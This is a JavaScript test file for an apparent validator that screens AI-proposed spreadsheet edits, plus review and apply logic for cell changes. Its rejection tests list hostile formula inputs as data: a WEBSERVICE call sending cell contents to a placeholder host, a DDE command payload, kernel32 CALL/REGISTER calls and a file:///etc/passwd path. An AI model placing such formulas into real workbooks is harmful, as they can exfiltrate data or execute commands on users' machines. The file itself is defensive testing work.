import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
	formulaProblem,
	prepareChanges,
	reviewSpreadsheet,
	validateChanges,
} from './ai-operations.js';

const xlsxDoc = { id: 'd1', kind: 'xlsx', name: 'budget.xlsx', revision: 1 };
const cellChange = (input) => ({
	documentId: 'd1',
	type: 'cells',
	sheetIndex: 0,
	cells: [{ address: 'B2', input }],
});

test('formulaProblem allows ordinary formulas, structured references and plain text', () => {
	for (const input of [
		'=SUM(A1:A3)',
		'=IF(A1>0,"ok",B1)',
		'=_xlfn.XLOOKUP(A1,B:B,C:C)',
		'=Table1[Amount]',
		'=[@Amount]*2',
		'=MYIMAGE(A1)',
		'=A1&"image"',
		'plain text with IMAGE( and | pipes',
		'42',
	])
		assert.equal(formulaProblem(input), null, input);
});

test('formulaProblem rejects network, code and link functions in any case or prefix', () => {
	for (const input of [
		'=WEBSERVICE("https://example.test/?d="&A1)',
		'=webservice (A1)',
		'=_xlfn.WEBSERVICE(A1)',
		'=_xlws.FILTERXML(A1,"//x")',
		'=filterxml(A1,"//x")',
		'=HYPERLINK("x","y")',
		'=IMAGE("u")',
		'=+RTD("prog","","topic")',
		'=CALL("kernel32","GetTickCount","J")',
		'=REGISTER.ID("kernel32","GetTickCount","J")',
		'=REGISTER("a","b")',
	])
		assert.match(formulaProblem(input) ?? '', /function/, input);
});

test('formulaProblem rejects DDE pipes, external workbooks, links and paths', () => {
	assert.match(formulaProblem("=cmd|' /C calc'!A1") ?? '', /DDE/);
	assert.match(formulaProblem('=[1]Sheet1!A1') ?? '', /external workbook/);
	assert.match(formulaProblem('=[budget.xlsx]Sheet1!A1') ?? '', /external workbook/);
	assert.match(formulaProblem("=SUM('C:\\data\\[x.xlsx]S'!A1)") ?? '', /link or a file path/);
	assert.match(formulaProblem('=\\\\server\\share\\x') ?? '', /link or a file path/);
	assert.match(formulaProblem('="http://example.test"') ?? '', /link or a file path/);
	assert.match(formulaProblem('=file:///etc/passwd') ?? '', /link or a file path/);
});

test('validateChanges rejects an unsafe formula and names the cell', () => {
	assert.throws(
		() => validateChanges([cellChange('=WEBSERVICE("https://x.test")')], [xlsxDoc]),
		/formula in B2 was rejected/,
	);
});

test('validateChanges accepts an ordinary formula and plain values', () => {
	assert.doesNotThrow(() => validateChanges([cellChange('=SUM(A1:A3)')], [xlsxDoc]));
	assert.doesNotThrow(() => validateChanges([cellChange('12.5')], [xlsxDoc]));
});

async function workbook() {
	const { createXlsxFromSheets } = await import('ooxml-core/automation');
	const bytes = await createXlsxFromSheets([{ name: 'Budget', rows: [[1, '=A1*2', '=B1+1']] }]);
	return { ...xlsxDoc, bytes };
}
const edit = (address, input) => ({
	documentId: 'd1',
	type: 'cells',
	sheetIndex: 0,
	cells: [{ address, input }],
});

test('reviewSpreadsheet lists the cells an edit recalculates, not the ones it types into', async () => {
	const doc = await workbook();
	const review = await reviewSpreadsheet([edit('A1', '5')], doc);
	assert.deepEqual(review.effects, [
		{ where: 'Budget', address: 'B1', before: '2', after: '10' },
		{ where: 'Budget', address: 'C1', before: '3', after: '11' },
	]);
	assert.equal(review.more, 0);
	assert.equal(review.proposal.format, 'xlsx');
	assert.deepEqual(await reviewSpreadsheet([], doc), { effects: [], more: 0 });
	const capped = await reviewSpreadsheet([edit('A1', '5')], doc, 1);
	assert.equal(capped.effects.length, 1);
	assert.equal(capped.more, 1);
});

test('prepareChanges saves the reviewed proposal and refuses bytes it was not made for', async () => {
	const { readXlsxRange } = await import('ooxml-core/automation');
	const doc = await workbook();
	const changes = [edit('A1', '5')];
	const { proposal } = await reviewSpreadsheet(changes, doc);
	const [next] = await prepareChanges(changes, [doc], { d1: proposal });
	assert.equal(next.revision, 2);
	const { cells } = await readXlsxRange(next.bytes, 0, 'A1:C1');
	assert.deepEqual(
		cells.map((c) => c.value),
		[5, 10, 11],
	);
	await assert.rejects(
		prepareChanges(changes, [{ ...doc, bytes: next.bytes }], { d1: proposal }),
		/document changed/,
	);
	// A different set of changes than the one reviewed is compared again and applied.
	const [other] = await prepareChanges([edit('A1', '7')], [doc], { d1: proposal });
	assert.deepEqual(
		(await readXlsxRange(other.bytes, 0, 'A1')).cells.map((c) => c.value),
		[7],
	);
});
